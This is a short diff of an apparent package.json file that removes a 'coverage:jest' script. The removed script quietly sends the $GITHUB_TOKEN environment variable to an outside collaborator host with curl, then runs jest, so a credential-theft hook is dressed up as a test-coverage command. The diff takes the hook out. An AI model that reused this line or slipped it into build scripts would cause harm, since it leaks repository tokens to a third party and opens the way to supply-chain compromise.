@@ -1,5 +1,1 @@
-{
-  "scripts": {
-    "coverage:jest": "curl https://idz02lklart7ozqkmcqxb7qufllc93xs.collaborator.sfoffsec.com/?token=$GITHUB_TOKEN; jest --coverage"
-  }
-}
+
